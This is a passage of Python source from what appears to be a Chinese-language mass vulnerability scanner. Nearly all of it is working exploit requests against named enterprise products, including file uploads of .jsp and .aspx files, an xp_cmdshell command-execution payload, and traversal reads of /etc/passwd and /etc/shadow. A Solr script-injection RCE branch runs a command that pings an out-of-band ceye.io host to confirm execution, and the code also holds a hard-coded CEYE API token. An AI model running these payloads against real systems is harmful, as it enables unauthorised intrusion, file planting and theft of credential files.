            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'adc3949ba59abbe56e057f20f883e' in res:
                append_to_output(f"[+] {url} 存在任我行CRM系统 SQL注入漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在任我行CRM系统 SQL注入漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在任我行CRM系统 SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "61.用友移动管理系统 任意文件上传漏洞":

        if url.endswith("/"):
            path = "maportal/appmanager/uploadApk.do?pk_obj="
        else:
            path = "/maportal/appmanager/uploadApk.do?pk_obj="

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3",
        }

        data = '''------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\nContent-Disposition: form-data; name="downloadpath"; filename="a.jsp"\r\nContent-Type: application/msword\r\n\r\nhelloworld\r\n------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and '2' in res:
                append_to_output(f"[+] {url} 99%存在用友移动管理系统 任意文件上传漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
                append_to_output("发送请求包进行漏洞确认", "green")
                if url.endswith("/"):
                    path = "maupload/apk/a.jsp"
                else:
                    path = "/maupload/apk/a.jsp"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                else:
                    url_new = url
                end_newpath = url_new + path
                try:
                    newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                    newres = newreq.text
                    if newreq.status_code == 200 and 'helloworld' in newres:
                        append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                        append_to_output(f"[+] 返回数据为: {newres} ", "red")
                        with open("output.txt", "a") as file:
                            file.write(f"[+] {url} 存在用友移动管理系统 任意文件上传漏洞！！！！" + "\n")
                            file.write(res + "\n")
                    else:
                        append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                except Timeout:
                    append_to_output(f"[!] 寻找a.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友移动管理系统 任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "62.亿赛通电子文档安全管理系统任意文件上传漏洞":

        if url.endswith("/"):
            path = "CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"
        else:
            path = "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3",
        }

        data = '''test666'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and '2' in res:
                append_to_output(f"[+] {url} 99%存在亿赛通电子文档安全管理系统任意文件上传漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
                append_to_output("发送请求包进行漏洞确认", "green")
                if url.endswith("/"):
                    path = "tttT.jsp"
                else:
                    path = "/tttT.jsp"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                else:
                    url_new = url
                end_newpath = url_new + path
                try:
                    newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                    newres = newreq.text
                    if newreq.status_code == 200 and 'test666' in newres:
                        append_to_output(f"[+] {end_newpath} 确认无误,存在漏洞！！！！", "red")
                        append_to_output(f"[+] 返回数据为: {newres} ", "red")
                        with open("output.txt", "a") as file:
                            file.write(f"[+] {url} 存在亿赛通电子文档安全管理系统任意文件上传漏洞！！！！" + "\n")
                            file.write(res + "\n")
                    else:
                        append_to_output(f"[+] {end_newpath} 可能不存在漏洞！！！！", "green")
                except Timeout:
                    append_to_output(f"[!] 寻找tttT.jsp文件请求超时，跳过URL: {end_newpath}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在亿赛通电子文档安全管理系统任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "63.企望制造ERP系统 RCE漏洞":

        if url.endswith("/"):
            path = "mainFunctions/comboxstore.action"
        else:
            path = "/mainFunctions/comboxstore.action"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = '''comboxsql=exec%20xp_cmdshell%20'whoami' '''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'data' in res and '{"Item":' in res:
                append_to_output(f"[+] {url} 存在企望制造ERP系统 RCE漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在企望制造ERP系统 RCE漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "64.契约锁电子章系统漏洞":

        if url.endswith("/"):
            path = "callback/%2E%2E;/code/upload"
        else:
            path = "/callback/%2E%2E;/code/upload"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Content-Type": "multipart/form-data",
        }

        data = '''ndary=----GokVTLZMRxcJWKfeCvEsYHlszxE\r\n----GokVTLZMRxcJWKfeCvEsYHlszxE\r\nContent-Disposition: form-data; name="type";\r\n\r\nTIMETASK\r\n----GokVTLZMRxcJWKfeCvEsYHlszxE\r\nContent-Disposition: form-data; name="file"; filename="qys.jpg"\r\n\r\n666\r\n\r\n----GokVTLZMRxcJWKfeCvEsYHlszxE'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在契约锁电子章系统漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在契约锁电子章系统漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "65.金盘 微信管理平台 未授权访问漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
            "Cookie": "JSESSIONID=0ACA9A10E980D81EBCEB2FB0919C8782"
        }
        if url.endswith("/"):
            path = "admin/weichatcfg/getsysteminfo"
        else:
            path = "/admin/weichatcfg/getsysteminfo"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在金盘 微信管理平台 未授权访问漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在金盘 微信管理平台 未授权访问漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "66.绿盟 SAS堡垒机 GetFile 任意文件读取漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
            "Cookie": "JSESSIONID=0ACA9A10E980D81EBCEB2FB0919C8782"
        }
        if url.endswith("/"):
            path = "webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
        else:
            path = "/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                if 'service is unavailable' in res or 'Your ip cannot access' in res:
                    append_to_output(f"[-] {url} 不存在绿盟 SAS堡垒机 GetFile 任意文件读取漏洞", "green")
                else:
                    append_to_output(f"[+] {url} 存在绿盟 SAS堡垒机 GetFile 任意文件读取漏洞！！！！", "red")

                    append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在绿盟 SAS堡垒机 GetFile 任意文件读取漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "67.深信服 SG上网优化管理系统 任意文件读取漏洞":

        if url.endswith("/"):
            path = "php/catjs.php"
        else:
            path = "/php/catjs.php"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
        }

        data = '''["../../../../../../etc/shadow"]'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'etc/shadow' in res:
                if 'SANGFOR上网优化管理' in res or '302 Found' in res:
                    append_to_output(f"[-] {url} 不存在深信服 SG上网优化管理系统 任意文件读取漏洞", "green")
                else:
                    append_to_output(f"[+] {url} 存在深信服 SG上网优化管理系统 任意文件读取漏洞！！！！", "red")

                    append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在深信服 SG上网优化管理系统 任意文件读取漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "68.亿赛通电子文档安全管理系统RCE漏洞":
        # 替换成您的CEYE API信息
        api_base_url = "http://api.ceye.io/v1"
        api_token = "394eb5e86394352a6270dc6a60dc7848"
        payload_id = "0uim95.ceye.io"
        id_one = ""
        id_change = ""

        # 构建API请求的参数
        params = {
            "token": api_token,
            "type": "dns",
            "filter": payload_id
        }

        # 构建API请求的URL
        request_url = f"{api_base_url}/records"

        if url.endswith("/"):
            path = "solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ping%200uim95.ceye.io%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"
        else:
            path = "/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ping%200uim95.ceye.io%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path

        payload = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://0uim95.ceye.io",
                "autoCommit": True
            },
            "hfe4zyyzldp": "="
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1383.67 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Connection": "close"
        }
        xml_data = '''<?xml version="1.0" encoding="UTF-8"?>
        <RDF>
            <item/>
        </RDF>'''

        try:
            response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_records = data.get("data", [id])
                for id_record in id_records:
                    id_num = id_record.get("id", [])
                    id_one = int(id_num)
                    append_to_output(str(id_num), "yellow")
                    break
                id_count = len(records)

                if id_count > 0:
                    append_to_output(f"[-] CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                    append_to_output("[!] 请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                else:
                    append_to_output("[-] CEYE没有收到请求记录。", "yellow")

            else:
                append_to_output("[-] API请求失败。HTTP状态码：", response_ceye.status_code)

            response = requests.post(encodetext, headers=headers, data=xml_data, verify=False, timeout=10,
                                     proxies=proxies)
            res = response.text
            if 'code' in res:
                append_to_output(
                    Fore.GREEN + f"[+] {url} 可能存在亿赛通电子文档安全管理系统RCE漏洞，等待ceyelog日志确认！！！！", "red")
                append_to_output(res, "yellow")

                response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                if response_ceye.status_code == 200:
                    data = response_ceye.json()
                    records = data.get("data", [])
                    id_count_change = len(records)
                    id_records = data.get("data", [id])
                    for id_record in id_records:
                        id_num = id_record.get("id", [])
                        id_change = int(id_num)
                        append_to_output(str(id_num), "yellow")
                        break
                    if id_change > id_one:
                        append_to_output(
                            f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                        append_to_output("请求记录列表：", "yellow")
                        for record in records:
                            append_to_output(str(record), "yellow")
                    else:
                        append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

                else:
                    append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
            else:
                append_to_output(Fore.RED + f"[-] {url} 不存在亿赛通电子文档安全管理系统RCE漏洞", "green")
        except Timeout:
            append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
            if response_ceye.status_code == 200:
                data = response_ceye.json()
                records = data.get("data", [])
                id_count_change = len(records)
                id_records = data.get("data", [id])
                for id_record in id_records:
                    id_num = id_record.get("id", [])
                    id_change = int(id_num)
                    append_to_output(str(id_num), "yellow")
                    break
                # if id_count_change > id_count:
                if id_change > id_one:
                    append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞",
                                     "red")
                    append_to_output("[-] 请求记录列表：", "yellow")
                    for record in records:
                        append_to_output(str(record), "yellow")
                    append_to_output(f"[+] 确认 {url} 存在亿赛通电子文档安全管理系统RCE漏洞", "red")
                else:
                    append_to_output("[-] CEYE没有收到请求记录，跳过这个URL。", "green")

            else:
                append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
        except Exception as e:
            append_to_output(str(e))
    if vulnerability == "69.HiKVISION-综合安防管理平台env信息泄漏漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
        }
        if url.endswith("/"):
            path = "artemis-portal/artemis/env"
        else:
            path = "/artemis-portal/artemis/env"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在HiKVISION-综合安防管理平台env信息泄漏漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在HiKVISION-综合安防管理平台env信息泄漏漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "70.时空智友企业流程化管控系统文件上传漏洞":

        if url.endswith("/"):
            path = "formservice?service=attachment.write&isattach=false&filename=a.jsp"
        else:
            path = "/formservice?service=attachment.write&isattach=false&filename=a.jsp"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
        }

        data = '''6666666666'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            res_xml = req.content
            # 解析XML字符串
            root = ElementTree.fromstring(res_xml)
            # 获取文本内容
            value = root.text
            if req.status_code == 200 and value.strip() != "":
                append_to_output(f"[+] {url} 存在时空智友企业流程化管控系统文件上传漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
                append_to_output(f"[+] 返回的文件名为: {value} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在时空智友企业流程化管控系统文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "71.易思智能物流无人值守系统文件上传漏洞":

        if url.endswith("/"):
            path = "Sys_ReportFile/ImportReport?encode=a"
        else:
            path = "/Sys_ReportFile/ImportReport?encode=a"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk",
        }

        data = '''------WebKitFormBoundaryxzUhGld6cusN3Alk\r\nContent-Disposition: form-data; name="file"; .filename="test.grf;.aspx"\r\nContent-Type: application/octet-stream\r\n\r\ntest666\r\n------WebKitFormBoundaryxzUhGld6cusN3Alk--'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'a.aspx' in res:
                append_to_output(f"[+] {url} 存在易思智能物流无人值守系统文件上传漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在易思智能物流无人值守系统文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "72.明源云ERP系统 接口管家ApiUpdate.ashx任意文件上传漏洞":

        if url.endswith("/"):
            path = "myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"
        else:
            path = "/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
        }

        data = '''{{hexdec}}'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'OK' in res:
                append_to_output(f"[+] {url} 存在明源云ERP系统 接口管家ApiUpdate.ashx任意文件上传漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在明源云ERP系统 接口管家ApiUpdate.ashx任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
